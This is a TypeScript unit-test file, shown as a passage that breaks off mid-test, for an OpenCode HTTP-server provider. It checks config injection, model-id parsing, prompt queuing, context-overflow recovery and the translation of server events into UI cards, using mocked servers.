// SPDX-FileCopyrightText: 2026 King Young Technology
// SPDX-License-Identifier: MIT
//
// Tests for openCodeProvider (HTTP-server transport).
//
// We deliberately don't spin up the real opencode server in tests — those
// would be flaky and slow. Instead we:
//   • Unit-test the pure helpers (isValidOpenCodeModelId, parseModelId, bin lookup).
//   • Drive the SessionEventRouter directly with real-shape SSE envelopes
//     captured from a live `opencode serve` /event stream.
//   • Verify OpencodeSession's hot-resume path (sendUserMessage triggers a
//     prompt POST against a mocked server).
import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import { dirname, join } from 'path';
import { fileURLToPath } from 'url';

const __testDir = dirname(fileURLToPath(import.meta.url));

// ── Mock child_process for binary lookup ─────────────────────────────────────

const mockExecSync = vi.fn();
vi.mock('child_process', () => ({
  spawn: vi.fn(),
  execSync: (cmd: string, opts?: unknown) => mockExecSync(cmd, opts),
}));

// Provider tests must not inherit the developer machine's persisted Guardian
// configuration. Model-server availability is controlled explicitly through
// environment variables in the relevant test cases.
vi.mock('../config.js', async (importOriginal) => {
  const actual = await importOriginal<typeof import('../config.js')>();
  return {
    ...actual,
    getGuardianModelServerConfig: () => {
      const baseUrl = process.env.QUICKSAVE_GUARDIAN_MODEL_SERVER_URL?.trim();
      const model = process.env.QUICKSAVE_GUARDIAN_MODEL?.trim();
      if (!baseUrl || !model) return undefined;
      const apiKey = process.env.QUICKSAVE_GUARDIAN_MODEL_SERVER_API_KEY?.trim();
      return { baseUrl, model, ...(apiKey ? { apiKey } : {}), enableThinking: false };
    },
  };
});

// ── Imports under test ───────────────────────────────────────────────────────

import {
  OpenCodeProvider,
  OpencodeSession,
  SessionEventRouter,
  isValidOpenCodeModelId,
  parseModelId,
  getOpenCodeBin,
  _resetOpenCodeBinCache,
  normalizeOpenCodeToolInput,
  normalizeOpenCodeToolName,
  isOpenCodeContextOverflowError,
  projectOpenCodeMessages,
  type TurnConfig,
} from './openCodeProvider.js';
import { StreamCardBuilder } from './cardBuilder.js';
import type { ProviderCallbacks } from './provider.js';
import type { OpenCodeServer, OpenCodeEvent } from './openCodeServer.js';
import {
  buildOpenCodeQuicksaveConfig,
  buildOpenCodePromptParts,
  buildOpenCodeRequestHeaders,
  buildOpenCodeServerEnv,
  buildOpenCodeUrl,
  getOpenCodeServer,
  getOpenCodeEventSessionId,
  normalizeOpenCodeMessagePage,
  OPENCODE_QUICKSAVE_MCP_NAME,
  _resetOpenCodeServer,
} from './openCodeServer.js';

// ── Helpers ──────────────────────────────────────────────────────────────────

function makeCallbacks(): ProviderCallbacks & {
  cards: any[]; ends: any[]; tools: any[];
} {
  const cards: any[] = [];
  const ends: any[] = [];
  const tools: any[] = [];
  return {
    cards, ends, tools,
    emitCardEvent: (e) => { cards.push(e); },
    emitStreamEnd: (e) => { ends.push(e); },
    onToolUse: (sessionId, toolName, input) => { tools.push({ sessionId, toolName, input }); },
    onModelDetected: vi.fn(),
    onCacheTouch: vi.fn(),
    onQueueStateChange: vi.fn(),
    onSessionExited: vi.fn(),
    handlePermissionRequest: async () => ({ action: 'allow' as const }),
  };
}

function makeMockServer(): OpenCodeServer & {
  creates: Array<Record<string, unknown>>;
  prompts: Array<{ sessionID: string; directory: string; body: any }>;
  aborts: Array<{ sessionID: string; directory: string }>;
  replies: Array<{ requestID: string; directory: string; reply: string; message?: string }>;
  questionReplies: Array<{ requestID: string; directory: string; answers: string[][] }>;
  questionRejections: Array<{ requestID: string; directory: string }>;
  messages: Array<{ info: Record<string, unknown>; parts: Array<Record<string, unknown>> }>;
  permissionUpdates: Array<{ sessionID: string; directory: string; permission: unknown[] }>;
} {
  const creates: Array<Record<string, unknown>> = [];
  const prompts: Array<{ sessionID: string; directory: string; body: any }> = [];
  const aborts: Array<{ sessionID: string; directory: string }> = [];
  const replies: Array<{ requestID: string; directory: string; reply: string; message?: string }> = [];
  const questionReplies: Array<{ requestID: string; directory: string; answers: string[][] }> = [];
  const questionRejections: Array<{ requestID: string; directory: string }> = [];
  const messages: Array<{ info: Record<string, unknown>; parts: Array<Record<string, unknown>> }> = [];
  const permissionUpdates: Array<{ sessionID: string; directory: string; permission: unknown[] }> = [];
  return {
    creates, prompts, aborts, replies, questionReplies, questionRejections, messages, permissionUpdates,
    ensureRunning: async () => ({ baseUrl: 'http://127.0.0.1:4096' }),
    createSession: async (opts) => { creates.push(opts); return { id: 'ses_mock' }; },
    deleteSession: async () => undefined,
    sendPromptAsync: async (sessionID, directory, body) => { prompts.push({ sessionID, directory, body }); },
    abortSession: async (sessionID, directory) => { aborts.push({ sessionID, directory }); },
    setSessionPermission: async (sessionID, directory, permission) => {
      permissionUpdates.push({ sessionID, directory, permission });
    },
    replyPermission: async (requestID, directory, reply, message) => {
      replies.push({ requestID, directory, reply, ...(message ? { message } : {}) });
    },
    replyQuestion: async (requestID, directory, answers) => {
      questionReplies.push({ requestID, directory, answers: answers.map((answer) => [...answer]) });
    },
    rejectQuestion: async (requestID, directory) => {
      questionRejections.push({ requestID, directory });
    },
    getMessages: async () => messages,
    getMessagePage: async () => ({ items: [], cursor: {} }),
    getHealth: async () => ({ healthy: true, version: '1.18.4' }),
    listProviders: async () => ({
      all: [
        {
          id: 'vllm',
          name: 'vLLM',
          models: { 'foo/bar': { id: 'foo/bar', name: 'Foo Bar' } },
        },
        {
          id: 'opencode',
          name: 'OpenCode',
          models: { 'big-pickle': { id: 'big-pickle', name: 'Big Pickle' } },
        },
      ],
      default: {},
      connected: ['vllm', 'opencode'],
    }),
    subscribe: () => () => {},
    subscribeAll: () => () => {},
    shutdown: async () => {},
  } as never;
}

/** Wait for the router's async finalize chain (REST sync + stream-end) to
 *  settle. The router fire-and-forgets the work via `void this.finalizeAsync()`
 *  so tests need a tick or two for callbacks to land. */
async function flushAsync(): Promise<void> {
  for (let i = 0; i < 5; i++) await Promise.resolve();
}

beforeEach(() => {
  mockExecSync.mockReset();
  delete process.env.OPENCODE_API_KEY;
  delete process.env.OPENAI_API_KEY;
  delete process.env.QUICKSAVE_GUARDIAN_MODEL_SERVER_URL;
  delete process.env.QUICKSAVE_GUARDIAN_MODEL;
  delete process.env.QUICKSAVE_GUARDIAN_MODEL_SERVER_API_KEY;
  _resetOpenCodeBinCache();
});

describe('OpenCode Quicksave MCP injection', () => {
  it('adds the Quicksave MCP, host plugin, and permission rules', () => {
    const config = buildOpenCodeQuicksaveConfig(undefined);
    const mcp = config.mcp as Record<string, {
      type: string;
      command: string[];
      enabled: boolean;
      timeout: number;
    }>;
    const command = mcp[OPENCODE_QUICKSAVE_MCP_NAME]?.command ?? [];

    expect(OPENCODE_QUICKSAVE_MCP_NAME).toBe('mcp__quicksave-tools_');
    expect(command[0]).toBe(join(
      __testDir,
      '..',
      '..',
      'node_modules',
      '.bin',
      'tsx',
    ));
    expect(command[1]).toBe(join(__testDir, 'quicksaveToolsMcpStdio.ts'));
    expect(command).not.toContain('--cwd');
    expect(config.plugin).toEqual([
      expect.stringMatching(/openCodeMcpPlugin\.ts$/),
    ]);
    expect(config.permission).toMatchObject({
      'mcp__quicksave-tools__UpdateSessionStatus': 'allow',
      'mcp__quicksave-tools__DisplayMarkdownReport': 'allow',
      question: 'allow',
    });
    expect(config.permission).not.toHaveProperty('mcp__quicksave-tools__SandboxBash');
  });

  it('preserves JSONC config content while overriding only Quicksave keys', () => {
    const env = buildOpenCodeServerEnv({
      OPENCODE_CONFIG_CONTENT: `{
        // keep the user's config
        "model": "vllm/test",
        "plugin": ["existing-plugin",],
        "permission": "ask",
        "mcp": {
          "existing": { "type": "remote", "url": "https://example.com/mcp", },
        },
      }`,
    });
    const config = JSON.parse(env.OPENCODE_CONFIG_CONTENT!) as Record<string, any>;

    expect(config.model).toBe('vllm/test');
    expect(config.plugin[0]).toBe('existing-plugin');
    expect(config.mcp.existing.url).toBe('https://example.com/mcp');
    expect(config.permission['*']).toBe('ask');
    expect(config.permission['mcp__quicksave-tools__UpdateSessionStatus']).toBe('allow');
  });

  it('enables built-in Exa only when the persistent machine setting asks for it', () => {
    const enabled = buildOpenCodeServerEnv({}, __testDir, true);
    const enabledConfig = JSON.parse(enabled.OPENCODE_CONFIG_CONTENT!) as Record<string, any>;
    expect(enabled.OPENCODE_ENABLE_EXA).toBe('1');
    expect(enabledConfig.permission.websearch).toBe('ask');

    const disabled = buildOpenCodeServerEnv({ OPENCODE_ENABLE_EXA: '1' }, __testDir, false);
    expect(disabled.OPENCODE_ENABLE_EXA).toBeUndefined();
  });
});

// ── Pure helpers ─────────────────────────────────────────────────────────────

describe('isValidOpenCodeModelId', () => {
  it('accepts provider/model', () => {
    expect(isValidOpenCodeModelId('opencode/big-pickle')).toBe(true);
    expect(isValidOpenCodeModelId('anthropic/claude-3-sonnet')).toBe(true);
  });
  it('accepts spaces inside model IDs', () => {
    expect(isValidOpenCodeModelId('thor-vllm/Qwen3.8 27B')).toBe(true);
  });
  it('accepts multi-segment paths', () => {
    expect(isValidOpenCodeModelId('vllm/palmfuture/Qwen3.6-35B')).toBe(true);
  });
  it('rejects bare ids and falsy', () => {
    expect(isValidOpenCodeModelId('claude-opus-4-7')).toBe(false);
    expect(isValidOpenCodeModelId(undefined)).toBe(false);
    expect(isValidOpenCodeModelId(null)).toBe(false);
    expect(isValidOpenCodeModelId('')).toBe(false);
    expect(isValidOpenCodeModelId('   ')).toBe(false);
    expect(isValidOpenCodeModelId('thor-vllm/ Qwen3.8 27B')).toBe(false);
    expect(isValidOpenCodeModelId('thor-vllm/Qwen3.8 27B ')).toBe(false);
  });
});

describe('parseModelId', () => {
  it('splits on the first slash', () => {
    expect(parseModelId('opencode/big-pickle')).toEqual({ providerID: 'opencode', modelID: 'big-pickle' });
  });
  it('keeps later slashes in modelID', () => {
    expect(parseModelId('vllm/palmfuture/Qwen3.6-35B')).toEqual({
      providerID: 'vllm', modelID: 'palmfuture/Qwen3.6-35B',
    });
  });
});

describe('OpenCode HTTP protocol helpers', () => {
  it('normalizes current, legacy, and nested message page responses', () => {
    const message = { id: 'msg_1', type: 'user', text: 'hello' };
    expect(normalizeOpenCodeMessagePage({ items: [message], cursor: { next: 'n1' } })).toEqual({
      items: [message], cursor: { next: 'n1' },
    });
    expect(normalizeOpenCodeMessagePage({ data: [message], cursor: {} }).items).toEqual([message]);
    expect(normalizeOpenCodeMessagePage({ items: { data: [message], cursor: { previous: 'p1' } } })).toEqual({
      items: [message], cursor: { previous: 'p1' },
    });
  });

  it('routes directory as a query parameter', () => {
    const url = buildOpenCodeUrl('http://127.0.0.1:4096', '/session/ses_1/message', {
      directory: '/workspace/a b',
    });
    expect(url.pathname).toBe('/session/ses_1/message');
    expect(url.searchParams.get('directory')).toBe('/workspace/a b');
  });

  it('encodes attachments as OpenCode file parts with data URLs', () => {
    expect(buildOpenCodePromptParts('inspect', [{
      id: 'att_1',
      kind: 'image',
      mimeType: 'image/png',
      name: 'screen.png',
      size: 3,
      data: 'YWJj',
    }])).toEqual([
      { type: 'text', text: 'inspect' },
      {
        type: 'file',
        mime: 'image/png',
        filename: 'screen.png',
        url: 'data:image/png;base64,YWJj',
      },
    ]);
  });

  it('finds session ids in both current and legacy event shapes', () => {
    expect(getOpenCodeEventSessionId({
      type: 'permission.asked',
      properties: { sessionID: 'ses_direct' },
    })).toBe('ses_direct');
    expect(getOpenCodeEventSessionId({
      type: 'message.part.updated',
      properties: { part: { sessionID: 'ses_nested', type: 'text' } },
    })).toBe('ses_nested');
  });

  it('uses OpenCode server credentials for REST and SSE', () => {
    expect(buildOpenCodeRequestHeaders(true, {
      OPENCODE_SERVER_USERNAME: 'quicksave',
      OPENCODE_SERVER_PASSWORD: 'secret',
    })).toEqual({
      'content-type': 'application/json',
      authorization: `Basic ${Buffer.from('quicksave:secret').toString('base64')}`,
    });
  });

  it('serializes a rejection rationale in the permission reply body', async () => {
    _resetOpenCodeServer();
    const server = getOpenCodeServer();
    const request = vi.fn(async () => true);
    (server as any).req = request;

    await server.replyPermission(
      'per_reason',
      '/workspace/a',
      'reject',
      'Use the read-only API instead',
    );

    expect(request).toHaveBeenCalledWith(
      '/permission/per_reason/reply',
      {
        method: 'POST',
        body: JSON.stringify({
          reply: 'reject',
          message: 'Use the read-only API instead',
        }),
      },
      { directory: '/workspace/a' },
    );
    _resetOpenCodeServer();
  });
});

describe('getOpenCodeBin', () => {
  it('returns "which opencode" output when available', () => {
    mockExecSync.mockImplementation(() => '/opt/bin/opencode');
    expect(getOpenCodeBin()).toBe('/opt/bin/opencode');
  });
  it('caches across calls', () => {
    mockExecSync.mockImplementation(() => '/opt/bin/opencode');
    getOpenCodeBin();
    getOpenCodeBin();
    expect(mockExecSync).toHaveBeenCalledTimes(1);
  });
  it('falls back to bare "opencode" when nothing is found', () => {
    mockExecSync.mockImplementation(() => { throw new Error('nope'); });
    const oldHome = process.env.HOME;
    delete process.env.HOME;
    try { expect(getOpenCodeBin()).toBe('opencode'); }
    finally { process.env.HOME = oldHome; }
  });
});

// ── OpencodeSession ──────────────────────────────────────────────────────────

describe('OpencodeSession', () => {
  const turnConfig: TurnConfig = { model: { providerID: 'opencode', modelID: 'big-pickle' } };

  it('interrupt fires server.abortSession', () => {
    const server = makeMockServer();
    const s = new OpencodeSession('ses_x', server, '/workspace', turnConfig);
    s.interrupt();
    // abort is fire-and-forget; allow the microtask to run.
    return new Promise<void>((r) => setImmediate(() => {
      expect(server.aborts).toContainEqual({ sessionID: 'ses_x', directory: '/workspace' });
      r();
    }));
  });

  it('kill marks dead and disposes', () => {
    const server = makeMockServer();
    const s = new OpencodeSession('ses_x', server, '/p', turnConfig);
    const dispose = vi.fn();
    s._setTurnWiring(
      new StreamCardBuilder('ses_x', '/p'),
      makeCallbacks(),
      new SessionEventRouter('ses_x', new StreamCardBuilder('ses_x', '/p'), makeCallbacks(), server),
      dispose,
    );
    s.kill();
    expect(s.alive).toBe(false);
    expect(dispose).toHaveBeenCalled();
  });

  it('sendUserMessage emits user card and POSTs prompt with stored model', async () => {
    const server = makeMockServer();
    const s = new OpencodeSession('ses_y', server, '/workspace', {
      model: { providerID: 'vllm', modelID: 'foo/bar' },
      variant: 'high',
      system: 'be brief',
    });
    const cb = new StreamCardBuilder('ses_y', '/p');
    const cbs = makeCallbacks();
    const router = new SessionEventRouter('ses_y', cb, cbs, server);
    s._setTurnWiring(cb, cbs, router, () => {});
    s.sendUserMessage('how are you?');
    await new Promise((r) => setImmediate(r));
    expect(cbs.cards.find((c: any) => c.card?.type === 'user')?.card?.text).toBe('how are you?');
    expect(server.prompts).toHaveLength(1);
    expect(server.prompts[0]).toEqual({
      sessionID: 'ses_y',
      directory: '/workspace',
      body: {
        text: 'how are you?',
        attachments: undefined,
        model: { providerID: 'vllm', modelID: 'foo/bar' },
        variant: 'high',
        system: 'be brief',
      },
    });
  });

  it('queues prompts during compaction and drains them after summarize completes', async () => {
    const server = makeMockServer();
    let finishCompact!: () => void;
    const compactSession = vi.fn(() => new Promise<void>((resolve) => { finishCompact = resolve; }));
    (server as any).compactSession = compactSession;
    const s = new OpencodeSession('ses_queue', server, '/workspace', turnConfig);
    const cb = new StreamCardBuilder('ses_queue', '/workspace');
    const cbs = makeCallbacks();
    const router = new SessionEventRouter('ses_queue', cb, cbs, server, {
      onFinalized: () => s._onTurnFinalized(),
    });
    s._setTurnWiring(cb, cbs, router, () => {});

    const firstCompact = s.compact();
    const duplicateCompact = s.compact();
    s.sendUserMessage('run after compact');

    expect(compactSession).toHaveBeenCalledTimes(1);
    expect(server.prompts).toHaveLength(0);
    expect(s.getQueueState()).toMatchObject({
      pendingUserMessages: 1,
      queuedPromptPreviews: ['run after compact'],
      canInterruptCurrentTurn: false,
    });

    finishCompact();
    await Promise.all([firstCompact, duplicateCompact]);
    await new Promise((resolve) => setImmediate(resolve));

    expect(server.prompts).toHaveLength(1);
    expect(server.prompts[0]?.body.text).toBe('run after compact');
    expect(s.getQueueState()).toBeNull();
  });

  it('serializes normal follow-up prompts through the existing queue', async () => {
    const server = makeMockServer();
    const s = new OpencodeSession('ses_queue', server, '/workspace', turnConfig);
    const cb = new StreamCardBuilder('ses_queue', '/workspace');
    const cbs = makeCallbacks();
    const router = new SessionEventRouter('ses_queue', cb, cbs, server, {
      onFinalized: () => s._onTurnFinalized(),
    });
    s._setTurnWiring(cb, cbs, router, () => {});

    s.sendUserMessage('first');
    s.sendUserMessage('second');
    expect(server.prompts.map((prompt) => prompt.body.text)).toEqual(['first']);
    expect(s.getQueueState()?.queuedPromptPreviews).toEqual(['second']);

    router.handle({ type: 'session.status', properties: { status: { type: 'idle' } } });
    await flushAsync();

    expect(server.prompts.map((prompt) => prompt.body.text)).toEqual(['first', 'second']);
    expect(s.getQueueState()).toBeNull();
  });

  it('puts an interrupting prompt ahead of ordinary queued work', async () => {
    const server = makeMockServer();
    const s = new OpencodeSession('ses_priority', server, '/workspace', turnConfig);
    const cb = new StreamCardBuilder('ses_priority', '/workspace');
    const cbs = makeCallbacks();
    const router = new SessionEventRouter('ses_priority', cb, cbs, server, {
      onFinalized: () => s._onTurnFinalized(),
    });
    s._setTurnWiring(cb, cbs, router, () => {}, true);
    s.sendUserMessage('ordinary later');
    s.interruptThenSendUserMessage('urgent now');
    expect(server.aborts).toHaveLength(1);
    expect(s.getQueueState()?.queuedPromptPreviews).toEqual(['urgent now', 'ordinary later']);
    s._onTurnFinalized();
    expect(server.prompts[0]?.body.text).toBe('urgent now');
    s._onTurnFinalized();
    expect(server.prompts[1]?.body.text).toBe('ordinary later');
  });

  it('continues once after OpenCode automatically compacts a context overflow', async () => {
    const server = makeMockServer();
    const s = new OpencodeSession('ses_overflow', server, '/workspace', turnConfig);
    const cb = new StreamCardBuilder('ses_overflow', '/workspace');
    const cbs = makeCallbacks();
    const router = new SessionEventRouter('ses_overflow', cb, cbs, server, {
      directory: '/workspace',
      onFinalized: () => s._onTurnFinalized(),
      onContextOverflow: (message) => s._beginContextOverflowRecovery(message),
      onContextOverflowCompacted: () => s._continueAfterContextOverflow(),
    });
    s._setTurnWiring(cb, cbs, router, () => {}, true);
    const overflow = "This model's maximum context length is 262144 tokens. However, you requested 32000 output tokens and your prompt contains at least 230145 input tokens.";

    router.handle({ type: 'session.error', properties: { error: { data: { message: overflow } } } });
    router.handle({ type: 'session.status', properties: { status: { type: 'idle' } } });
    await flushAsync();

    expect(cbs.ends).toHaveLength(0);
    expect(server.prompts).toHaveLength(1);
    expect(server.prompts[0]?.body.text).toContain('Continue from where you left off');
    expect(cbs.cards.some((event: any) => event.card?.subtype === 'compacting')).toBe(true);
    expect(cbs.cards.some((event: any) => event.card?.subtype === 'compacted')).toBe(true);

    router.handle({ type: 'session.error', properties: { error: { data: { message: overflow } } } });
    await flushAsync();
    expect(cbs.ends).toHaveLength(1);
    expect(cbs.ends[0]).toMatchObject({ success: false, error: overflow });
  });

  it('sendUserMessage on a killed session is a no-op', () => {
    const server = makeMockServer();
    const s = new OpencodeSession('ses_d', server, '/p', turnConfig);
    const cb = new StreamCardBuilder('ses_d', '/p');
    const cbs = makeCallbacks();
    s._setTurnWiring(cb, cbs, new SessionEventRouter('ses_d', cb, cbs, server), () => {});
    s.kill();
    s.sendUserMessage('ignored');
    expect(server.prompts).toHaveLength(0);
  });

  it('getContextUsage returns null (unsupported)', async () => {
    expect(await new OpencodeSession('ses_x', makeMockServer(), '/p', turnConfig).getContextUsage()).toBeNull();
  });
});

// ── SessionEventRouter ───────────────────────────────────────────────────────

describe('SessionEventRouter', () => {
  const makeRouter = () => {
    const server = makeMockServer();
    const cb = new StreamCardBuilder('ses_t', '/p');
    const cbs = makeCallbacks();
    const router = new SessionEventRouter('ses_t', cb, cbs, server, { directory: '/p' });
    return { router, cb, cbs, server };
  };

  function ev(type: string, properties: Record<string, unknown>): OpenCodeEvent {
    return { id: 'evt-' + Math.random(), type, properties };
  }

  it('streams text deltas into a single assistant_text card keyed by partID', () => {
    const { router, cb, cbs } = makeRouter();
    const props = (delta: string) => ({
      sessionID: 'ses_t', messageID: 'm', partID: 'prt_d', field: 'text', delta,
    });
    router.handle(ev('message.part.delta', props('hello')));
    router.handle(ev('message.part.delta', props(' world')));
    // First delta creates an `add` (assistant_text), subsequent deltas
    // append to the same card.
    const adds = cbs.cards.filter((c: any) => c.type === 'add' && c.card?.type === 'assistant_text');
    const appends = cbs.cards.filter((c: any) => c.type === 'append_text');
    expect(adds).toHaveLength(1);
    expect(appends).toHaveLength(1);
    expect(appends[0].text).toBe(' world');
    // Final accumulated text lives on the card (which the cardBuilder mutates
    // in-place as appends arrive).
    const persistedCards = cb.getCards();
    const textCard = persistedCards.find((c) => c.type === 'assistant_text');
    expect((textCard as any).text).toBe('hello world');
  });

  it('does not emit a card for a whitespace-only Markdown text part', () => {
    const { router, cb, cbs } = makeRouter();
    router.handle(ev('message.part.delta', {
      sessionID: 'ses_t',
      messageID: 'msg_assistant',
      partID: 'prt_separator',
      field: 'text',
      delta: '\n\n',
    }));
    router.handle(ev('message.part.updated', {
      part: {
        id: 'prt_tool',
        sessionID: 'ses_t',
        messageID: 'msg_assistant',
        type: 'tool',
        tool: 'read',
        callID: 'call_after_separator',
        state: { status: 'running', input: {} },
      },
    }));

    expect(cb.getCards().filter((card) => card.type === 'assistant_text')).toHaveLength(0);
    expect(cbs.cards.filter((event: any) => event.card?.type === 'assistant_text')).toHaveLength(0);
  });

  it('keeps buffered leading whitespace when visible text arrives', () => {
    const { router, cb } = makeRouter();
    const props = (delta: string) => ({
      sessionID: 'ses_t',
      messageID: 'msg_assistant',
      partID: 'prt_text',
      field: 'text',
      delta,
    });
    router.handle(ev('message.part.delta', props('\n\n')));
    router.handle(ev('message.part.delta', props('visible answer')));

    expect(cb.getCards().filter((card) => card.type === 'assistant_text')).toEqual([
      expect.objectContaining({ text: '\n\nvisible answer' }),
    ]);
  });

  it('does not echo OpenCode user message parts as assistant text', () => {
    const { router, cbs } = makeRouter();
    router.handle(ev('message.updated', {
      info: { id: 'msg_user', sessionID: 'ses_t', role: 'user' },
    }));
    router.handle(ev('message.part.updated', {
      part: {
        id: 'prt_user',
        sessionID: 'ses_t',
        messageID: 'msg_user',
        type: 'text',
        text: 'same prompt',
      },
    }));
    expect(cbs.cards.filter((event: any) => event.card?.type === 'assistant_text')).toHaveLength(0);
  });

  it('dedupes a final text snapshot after streaming deltas', () => {
    const { router, cb } = makeRouter();
    router.handle(ev('message.part.updated', {
      part: {
        id: 'prt_text',
        sessionID: 'ses_t',
        messageID: 'msg_assistant',
        type: 'text',
        text: '',
      },
    }));
    router.handle(ev('message.part.delta', {
      sessionID: 'ses_t',
      messageID: 'msg_assistant',
      partID: 'prt_text',
      field: 'text',
      delta: 'final answer',
    }));
    router.handle(ev('message.part.updated', {
      part: {
        id: 'prt_text',
        sessionID: 'ses_t',
        messageID: 'msg_assistant',
        type: 'text',
        text: 'final answer',
      },
    }));
    const text = cb.getCards().find((card) => card.type === 'assistant_text');
    expect(text).toMatchObject({ text: 'final answer' });
  });

  it('uses the part type when reasoning deltas report field=text', async () => {
    const { router, cb } = makeRouter();
    router.handle(ev('message.part.updated', {
      part: {
        id: 'prt_reasoning',
        sessionID: 'ses_t',
        messageID: 'msg_assistant',
        type: 'reasoning',
        text: '',
      },
    }));
    router.handle(ev('message.part.delta', {
      sessionID: 'ses_t',
      messageID: 'msg_assistant',
      partID: 'prt_reasoning',
      field: 'text',
      delta: 'private thought',
    }));
    router.handle(ev('message.part.updated', {
      part: {
        id: 'prt_reasoning',
        sessionID: 'ses_t',
        messageID: 'msg_assistant',
        type: 'reasoning',
        text: 'private thought',
      },
    }));
    router.handle(ev('session.idle', { sessionID: 'ses_t' }));
    await flushAsync();
    expect(cb.getCards().filter((card) => card.type === 'assistant_text')).toHaveLength(0);
    expect(cb.getCards().filter((card) => card.type === 'thinking')).toEqual([
      expect.objectContaining({ text: 'private thought' }),
    ]);
  });

  it('starts a new assistant_text card when partID changes', () => {
    const { router, cbs } = makeRouter();
    router.handle(ev('message.part.delta', {
      sessionID: 'ses_t', messageID: 'm', partID: 'prt_a', field: 'text', delta: 'first',
    }));
    router.handle(ev('message.part.delta', {
      sessionID: 'ses_t', messageID: 'm', partID: 'prt_b', field: 'text', delta: 'second',
    }));
    const newCards = cbs.cards.filter((c: any) => c.type === 'add' && c.card?.type === 'assistant_text');
    expect(newCards).toHaveLength(2);
    expect(newCards[0].card.text).toBe('first');
    expect(newCards[1].card.text).toBe('second');
  });

  it('buffers reasoning deltas and emits one thinkingBlock per part on finalize', async () => {
    const { router, cbs } = makeRouter();
    router.handle(ev('message.part.delta', {
      sessionID: 'ses_t', messageID: 'm', partID: 'prt_r', field: 'reasoning', delta: 'pon',
    }));
    router.handle(ev('message.part.delta', {
      sessionID: 'ses_t', messageID: 'm', partID: 'prt_r', field: 'reasoning', delta: 'dering',
    }));
    // No card yet — buffered.
    expect(cbs.cards.filter((c: any) => c.card?.type === 'thinking')).toHaveLength(0);
    router.handle(ev('session.idle', { sessionID: 'ses_t' }));
    await flushAsync();
    const think = cbs.cards.find((c: any) => c.card?.type === 'thinking');
    expect(think?.card?.text).toBe('pondering');
  });

  it('emits assistantText for a text part snapshot', () => {
    const { router, cbs } = makeRouter();
    router.handle(ev('message.part.updated', {
      sessionID: 'ses_t', time: 1,
      part: { id: 'prt_1', sessionID: 'ses_t', messageID: 'msg_1', type: 'text', text: 'hello' },
    }));
    const text = cbs.cards.find((c: any) => c.card?.type === 'assistant_text');
    expect(text?.card?.text).toBe('hello');
  });

  it('handles late text growth as a delta append', () => {
    const { router, cbs } = makeRouter();
    const part = { id: 'prt_g', sessionID: 'ses_t', messageID: 'msg_g', type: 'text' as const };
    router.handle(ev('message.part.updated', { sessionID: 'ses_t', time: 1, part: { ...part, text: 'hi' } }));
    router.handle(ev('message.part.updated', { sessionID: 'ses_t', time: 2, part: { ...part, text: 'hi there' } }));
    // First emit creates the card; second appends " there" to the same card via assistantText
    const texts = cbs.cards.filter((c: any) => (c.type === 'add' && c.card?.type === 'assistant_text') || c.type === 'append_text');
    // Should have at least one add and one append (or two adds if finalized in between).
    expect(texts.length).toBeGreaterThanOrEqual(2);
  });

  it('ignores synthetic/ignored text parts', () => {
    const { router, cbs } = makeRouter();
    router.handle(ev('message.part.updated', {
      sessionID: 'ses_t', time: 1,
      part: { id: 'prt_i', sessionID: 'ses_t', messageID: 'm', type: 'text', text: 'noise', ignored: true },
    }));
    expect(cbs.cards.filter((c: any) => c.card?.type === 'assistant_text')).toHaveLength(0);
  });

  it('emits a thinking block for a reasoning part', () => {
    const { router, cbs } = makeRouter();
    router.handle(ev('message.part.updated', {
      sessionID: 'ses_t', time: 1,
      part: { id: 'prt_r', sessionID: 'ses_t', messageID: 'm', type: 'reasoning', text: 'pondering' },
    }));
    const think = cbs.cards.find((c: any) => c.card?.type === 'thinking');
    expect(think?.card?.text).toBe('pondering');
  });

  it('dedupes reasoning parts by id', () => {
    const { router, cbs } = makeRouter();
    const part = { id: 'prt_r', sessionID: 'ses_t', messageID: 'm', type: 'reasoning' as const, text: 'pondering' };
    router.handle(ev('message.part.updated', { sessionID: 'ses_t', time: 1, part }));
    router.handle(ev('message.part.updated', { sessionID: 'ses_t', time: 2, part }));
    const thinks = cbs.cards.filter((c: any) => c.card?.type === 'thinking');
    expect(thinks).toHaveLength(1);
  });

  it('emits only the added reasoning when a snapshot grows', () => {
    const { router, cbs } = makeRouter();
    const part = { id: 'prt_r', sessionID: 'ses_t', messageID: 'm', type: 'reasoning' as const };
    router.handle(ev('message.part.updated', { sessionID: 'ses_t', part: { ...part, text: 'ponder' } }));
    router.handle(ev('message.part.updated', { sessionID: 'ses_t', part: { ...part, text: 'ponder more' } }));
    const thinks = cbs.cards.filter((c: any) => c.card?.type === 'thinking');
    expect(thinks.map((c: any) => c.card.text)).toEqual(['ponder', ' more']);
  });

  it('translates a tool part: completed → toolUse + toolResult', () => {
    const { router, cbs } = makeRouter();
    router.handle(ev('message.part.updated', {
      sessionID: 'ses_t', time: 1,
      part: {
        id: 'prt_t', sessionID: 'ses_t', messageID: 'm', type: 'tool',
        tool: 'read', callID: 'call_a',
        state: { status: 'completed', input: { filePath: '/etc/hosts' }, output: '127.0.0.1 localhost' },
      },
    }));
    expect(cbs.tools).toEqual([{
      sessionId: 'ses_t',
      toolName: 'Read',
      input: { filePath: '/etc/hosts', file_path: '/etc/hosts' },
    }]);
    const result = cbs.cards.find((c: any) => c.type === 'update' && c.patch?.result);
    expect(result?.patch?.result?.content).toBe('127.0.0.1 localhost');
    expect(result?.patch?.result?.isError).toBe(false);
  });

  it('translates a tool part: error state surfaces error message', () => {
    const { router, cbs } = makeRouter();
    router.handle(ev('message.part.updated', {
      sessionID: 'ses_t', time: 1,
      part: {
        id: 'prt_t', sessionID: 'ses_t', messageID: 'm', type: 'tool',
        tool: 'bash', callID: 'call_e',
        state: { status: 'error', input: {}, error: 'permission denied' },
      },
    }));
    const result = cbs.cards.find((c: any) => c.type === 'update' && c.patch?.result);
    expect(result?.patch?.result?.isError).toBe(true);
    expect(result?.patch?.result?.content).toBe('permission denied');
  });

  it('does not emit a toolResult for pending state', () => {
    const { router, cbs } = makeRouter();
    router.handle(ev('message.part.updated', {
      sessionID: 'ses_t', time: 1,
      part: {
        id: 'prt_t', sessionID: 'ses_t', messageID: 'm', type: 'tool',
        tool: 'read', callID: 'call_p', state: { status: 'pending', input: { filePath: '/x' } },
      },
    }));
    expect(cbs.cards.find((c: any) => c.type === 'update' && c.patch?.result)).toBeUndefined();
    const call = cbs.cards.find((c: any) => c.card?.type === 'tool_call');
    expect(call).toBeTruthy();
  });

  it('mirrors OpenCode task tools into the provider-neutral sub-agent registry', () => {
    const { router, cb, cbs } = makeRouter();
    const part = {
